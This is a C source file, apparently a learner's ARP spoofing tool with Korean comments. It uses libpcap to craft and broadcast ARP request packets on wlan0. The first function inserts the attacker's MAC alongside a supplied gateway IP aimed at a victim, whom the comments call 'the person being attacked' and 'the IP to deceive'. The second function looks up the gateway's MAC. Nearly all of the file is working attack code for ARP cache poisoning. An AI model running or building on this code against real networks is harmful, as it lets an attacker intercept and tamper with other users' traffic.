#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <net/if_arp.h>
#include "arpheader.h"
#include <stdlib.h>
#include <netinet/in.h>

void broadcast(char* argv[],pcap_t *handle)
{
    /*
   //IP check
  int i=0;
  for(i=2;i<4;i++)
  {
      printf("aa %s\n",argv[i]);
  }*/
    printf("#########################################Start\n");

    //my mac 구하는 함수  -------------------------------
  struct ifreq s;
  int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

  strcpy(s.ifr_name, "wlan0");
  ioctl(fd, SIOCGIFHWADDR, &s);

  printf("My Mac Address : ");
  for (int x = 0; x < 6; ++x)
  printf("%02x ", (u_char) s.ifr_addr.sa_data[x]);
  printf("\n");

  //--------------------------------------------


  //const u_char *packet;
  //struct ether_header * ethhdr = (struct ether_header *) packet;

  u_char pkt[PACKETSIZE];
  struct allpacket *s_packet = (struct allpacket *)pkt;
  //패킷 입력 시
  printf("dmac:: ");
  // dmac search------------------------------------- Destination 입력
  for(int i=0; i<=5;i++)
  {
      s_packet->eth_dmac[i]= 0xFF;
      printf("%x ",s_packet->eth_dmac[i]);
  }
  printf("\n");
  //smac --------------------------------------------
  printf("smac :");

     for(int i=0; i<=5;i++)
    {
        s_packet->eth_smac[i] = (u_char)s.ifr_addr.sa_data[i];  //나의 mac 입력
        printf("%02x ",s_packet->eth_smac[i]);
    }

    printf("\n");

      s_packet->type = ntohs(0x0806);                           //  ARP 0x0806
      printf("type : %04x\n",s_packet->type);
      s_packet->hd_type = ntohs(0x0001);                        // HardWare type : ethernet 1
      printf("hd_type %04x\n",s_packet->hd_type);
      s_packet->protocol_type = ntohs(0x0800);                  // Protocol type : IPv4 0x0800
      printf("protocol_type %04x\n",s_packet->protocol_type);
      s_packet->hd_size = 0x06;                                 // Hardware size 6 , Protocol size 4
      s_packet->protocol_size = 0x04;
      printf("hd_size %02x\n",s_packet->hd_size);
      printf("protocol_size %02x\n",s_packet->protocol_size);
      s_packet->opcode = ntohs(0x0001);                         // OPcode 1 = request ,2 = reply
      printf("opcode %04x\n",s_packet->opcode);


      printf("sender mac : ");                        // 나의 mac 입력 (sender 의 mac 주소)
      for(int i=0; i<=5;i++)
      {
           s_packet->arp_sender_mac[i] = s_packet->eth_smac[i] ;
           printf(" %02x ", s_packet->arp_sender_mac[i]);
      }
      printf("\n");

                                                     //sender(피해자)의 IP (게이트웨이 주소)

      //inet_aton(argv[3],&s_packet->arp_sender_ip);
      s_packet->arp_sender_ip = inet_addr(argv[3]);
      printf("#### %x \n",s_packet->arp_sender_ip);

      printf("Target Mac : ");                      // 속일 mac 주소(Sender의 mac 주소)(공격 당하는 사람)
      for(int i=0; i<=5;i++)
      {
           s_packet->arp_target_mac[i] = 0x00 ;
           printf(" %02x ", s_packet->arp_target_mac[i]);
      }
      //printf("%x ",s_packet->arp_target_mac);
      printf("\n");

      //inet_aton(argv[2],&s_packet->arp_target_ip);  // 속일 ip 주소
      s_packet->arp_target_ip = inet_addr(argv[2]);
      printf("target IP = %x \n", s_packet->arp_target_ip);


      int res = pcap_sendpacket(handle,pkt,sizeof(pkt));

      if(res == -1)
             printf(" error\n");
      else
            printf("**********************************success \n");




}


void gateway_mac(char* argv[],pcap_t *handle)
{

    printf("#########################################Start\n");

    //my mac 구하는 함수  -------------------------------
    struct jsave * addr_save;
    addr_save = (struct jsave *) malloc(sizeof (struct jsave));

  struct ifreq s;
  int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

  strcpy(s.ifr_name, "wlan0");
  ioctl(fd, SIOCGIFHWADDR, &s);

  printf("My Mac Address : ");
  for (int x = 0; x < 6; ++x)
  printf("%02x ", (u_char) s.ifr_addr.sa_data[x]);
  printf("\n");

  //--------------------------------------------
  struct ifreq ifr;
  char ipstr[40];
  int ss;

  ss = socket(AF_INET,SOCK_DGRAM,0);
  strncpy(ifr.ifr_name,"wlan0",IFNAMSIZ);

  if(ioctl(ss,SIOCGIFADDR,&ifr)<0){
      printf("아이피 구하지 못힘 \n");
  } else {
      inet_ntop(AF_INET,ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
      printf("나의 아이피는 : %s \n",ipstr);
}
//--------------------------------------------
  //const u_char *packet;
  //struct ether_header * ethhdr = (struct ether_header *) packet;

  u_char pkt[PACKETSIZE];
  struct allpacket *s_packet = (struct allpacket *)pkt;
  //패킷 입력 시
  printf("dmac:: ");
  // dmac search------------------------------------- Destination 입력
  for(int i=0; i<=5;i++)
  {
      s_packet->eth_dmac[i]= 0xFF;
      printf("%x ",s_packet->eth_dmac[i]);
  }
  printf("\n");
  //smac --------------------------------------------
  printf("smac :");

     for(int i=0; i<=5;i++)
    {
        s_packet->eth_smac[i] = (u_char)s.ifr_addr.sa_data[i];  //나의 mac 입력
        printf("%02x ",s_packet->eth_smac[i]);
    }

    printf("\n");

      s_packet->type = ntohs(0x0806);                           //  ARP 0x0806
      printf("type : %04x\n",s_packet->type);
      s_packet->hd_type = ntohs(0x0001);                        // HardWare type : ethernet 1
      printf("hd_type %04x\n",s_packet->hd_type);
      s_packet->protocol_type = ntohs(0x0800);                  // Protocol type : IPv4 0x0800
      printf("protocol_type %04x\n",s_packet->protocol_type);
      s_packet->hd_size = 0x06;                                 // Hardware size 6 , Protocol size 4
      s_packet->protocol_size = 0x04;
      printf("hd_size %02x\n",s_packet->hd_size);
      printf("protocol_size %02x\n",s_packet->protocol_size);
      s_packet->opcode = ntohs(0x0001);                         // OPcode 1 = request ,2 = reply
      printf("opcode %04x\n",s_packet->opcode);


      printf("sender mac : ");                        // 나의 mac 입력 (sender 의 mac 주소)
      for(int i=0; i<=5;i++)
      {
           s_packet->arp_sender_mac[i] = s_packet->eth_smac[i] ;
           printf(" %02x ", s_packet->arp_sender_mac[i]);
      }
      printf("\n");

      //inet_aton(argv[3],&s_packet->arp_sender_ip);
      s_packet->arp_sender_ip = inet_addr(ipstr);
      printf("#### %x \n",s_packet->arp_sender_ip);

      printf("Target Mac : ");                      // 속일 mac 주소(Sender의 mac 주소)(공격 당하는 사람)
      for(int i=0; i<=5;i++)
      {
           s_packet->arp_target_mac[i] = 0x00 ;
           printf(" %02x ", s_packet->arp_target_mac[i]);
      }
      //printf("%x ",s_packet->arp_target_mac);
      printf("\n");

      inet_aton(argv[3],&s_packet->arp_target_ip);  // 속일 ip 주소
      //s_packet->arp_target_ip = addr_save->save_tip;
      printf("target IP = %x \n", s_packet->arp_target_ip);


      int res = pcap_sendpacket(handle,pkt,sizeof(pkt));

      if(res == -1)
             printf(" error\n");
      else
            printf("**********************************success \n");




}
